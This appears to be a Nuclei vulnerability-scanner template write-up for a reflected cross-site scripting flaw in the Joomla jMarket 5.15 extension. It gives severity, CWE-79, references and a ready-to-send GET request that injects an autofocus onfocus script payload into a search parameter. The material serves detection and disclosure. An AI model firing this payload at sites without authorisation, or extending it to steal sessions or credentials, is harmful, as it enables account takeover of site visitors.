# Nuclei Template: Joomla jMarket 5.15 - Cross-Site Scripting
**Template ID:** joomla-jmarket-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** Medium
**CWE:** CWE-79
**Source:** Nuclei Template (`joomla-jmarket-xss.yaml`)

## Vulnerability Information & PoC

## Description
The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim's session token or login credentials.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/index.php?option=com_jvouchers&controller=catalog-results&task=query&wajx=1&wmjx=1&tmpl=component&type=raw&crtyid=12&trucs[x][search]=gx3vt%20onfocus=alert(document.domain)%20autofocus=%20itkrzsug7w5
```

## References
- https://packetstormsecurity.com/files/168581/Joomla-jMarket-5.15-Cross-Site-Scripting.html
- https://cxsecurity.com/issue/WLB-2022100002
- https://extensions.joomla.org/
